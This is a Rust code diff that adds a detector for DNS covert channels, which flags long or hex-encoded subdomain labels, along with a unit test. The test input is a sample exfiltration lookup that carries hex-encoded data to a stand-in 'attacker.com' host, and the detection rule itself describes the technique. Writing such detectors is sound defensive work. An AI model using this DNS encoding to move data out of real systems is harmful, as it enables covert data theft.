@@ -268,6 +268,32 @@ fn detect_dns_tunnel_exfil(input: &str) -> Option<RustDetection> {
     None
 }
 
+fn detect_dns_covert_channel(input: &str) -> Option<f32> {
+    static DOMAIN_RE: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r"(?i)\b[a-z0-9][a-z0-9-]{0,62}(?:\.[a-z0-9][a-z0-9-]{0,62}){2,}\b").unwrap()
+    });
+
+    let lower = input.to_ascii_lowercase();
+    for m in DOMAIN_RE.find_iter(&lower) {
+        let domain = m.as_str();
+        let labels: Vec<&str> = domain.split('.').collect();
+        if labels.len() < 3 {
+            continue;
+        }
+        for label in &labels[..labels.len() - 2] {
+            let is_long = label.len() > 40;
+            let is_hex_encoded = label.len() >= 20
+                && label.len() % 2 == 0
+                && label.chars().all(|c| c.is_ascii_hexdigit());
+            if is_long || is_hex_encoded {
+                return Some(0.89);
+            }
+        }
+    }
+
+    None
+}
+
 pub struct DnsEvaluator;
 
 impl L2Evaluator for DnsEvaluator {
@@ -502,6 +528,23 @@ impl L2Evaluator for DnsEvaluator {
         if let Some(det) = detect_dns_tunnel_exfil(&decoded) {
             dets.push(det);
         }
+        if let Some(confidence) = detect_dns_covert_channel(&decoded) {
+            let position = lower.find('.').unwrap_or(0);
+            dets.push(L2Detection {
+                detection_type: "dns_covert_channel".into(),
+                confidence: confidence.into(),
+                detail: "DNS covert channel indicators detected via long or hex-encoded subdomain labels".into(),
+                position,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::SemanticEval,
+                    matched_input: decoded[position.saturating_sub(20)..decoded.len().min(position + 120)]
+                        .to_string(),
+                    interpretation: "Subdomain labels are unusually long or hex-encoded, a common pattern for covert DNS command-and-control or data exfiltration channels.".into(),
+                    offset: position,
+                    property: "Monitor and block DNS queries with anomalous subdomain label lengths and encoded payload-like labels.".into(),
+                }],
+            });
+        }
 
         dets
     }
@@ -517,7 +560,8 @@ impl L2Evaluator for DnsEvaluator {
             | "dns_zone_transfer_attempt"
             | "dns_cache_poisoning"
             | "dns_amplification_abuse"
-            | "dns_tunnel_exfil" => Some(InvariantClass::DnsRebinding),
+            | "dns_tunnel_exfil"
+            | "dns_covert_channel" => Some(InvariantClass::DnsRebinding),
             "dns_subdomain_takeover" => Some(InvariantClass::SubdomainTakeover),
             _ => None,
         }
@@ -656,5 +700,13 @@ dns response qname=api.example.com ttl=300 rdata=8.8.8.8 forged authority sectio
     fn no_dns_tunnel_exfil_for_short_labels() {
         let input = "lookup api.dev.example.com";
         assert!(detect_dns_tunnel_exfil(input).is_none());
+    }
+
+    #[test]
+    fn detects_dns_covert_channel_via_long_or_hex_label() {
+        let eval = DnsEvaluator;
+        let input = "lookup 4a6f686e446f6544617461457866696c74726174696f6e.payload.attacker.com";
+        let dets = eval.detect(input);
+        assert!(dets.iter().any(|d| d.detection_type == "dns_covert_channel"));
     }
 }
